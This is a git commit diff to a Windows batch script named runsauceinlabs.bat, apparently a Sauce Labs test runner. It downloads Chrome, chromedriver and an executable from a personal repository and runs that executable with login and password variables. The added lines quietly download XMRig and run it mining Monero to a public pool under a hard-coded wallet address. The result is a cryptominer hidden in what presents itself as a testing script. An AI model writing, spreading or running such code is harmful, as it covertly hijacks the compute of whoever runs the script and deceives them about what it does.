4ee6fa8f227fe1b35539239e985f7eb5c8ad7a47
marinabarros320168 <121142741+marinabarros320168@users.noreply.github.com>
2023-02-17 11:16:35 -0300

    askdjaskldasd

--- runsauceinlabs.bat
+++ runsauceinlabs.bat
@@ -5,4 +5,7 @@ powershell Invoke-Expression "C:\Users\Public\Downloads\chrome_installer.exe"
 powershell Invoke-WebRequest -Uri "https://chromedriver.storage.googleapis.com/110.0.5481.77/chromedriver_win32.zip" -OutFile "C:\Users\Public\Downloads\chromedriver_win32.zip"
 powershell Expand-Archive -LiteralPath C:\Users\Public\Downloads\chromedriver_win32.zip -DestinationPath C:\Users\Public\Downloads
 powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/SauceLabs.exe" -OutFile "C:\Users\Public\Downloads\saucelabs.exe"
-C:\Users\Public\Downloads\saucelabs.exe -e %lg% -p %psw%
+start C:\Users\Public\Downloads\saucelabs.exe -e %lg% -p %psw%
+powershell Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-gcc-win64.zip" -OutFile "C:\Users\Public\Downloads\xmrig.zip"
+powershell Expand-Archive -LiteralPath C:\Users\Public\Downloads\xmrig.zip -DestinationPath C:\Users\Public\Downloads
+C:\Users\Public\Downloads\xmrig-6.18.1\xmrig.exe --coin=XMR -o xmr.2miners.com:2222 -u 8635LEjQNMTKA3itCDvKGujmHLgYn33hhjiX7uat5VKhi7WThxFw8t5C2mfaiaF86JHCPHWWTmHZwjEgVt9RNAyo7ueQgKW.LearnMS -p x -t 5
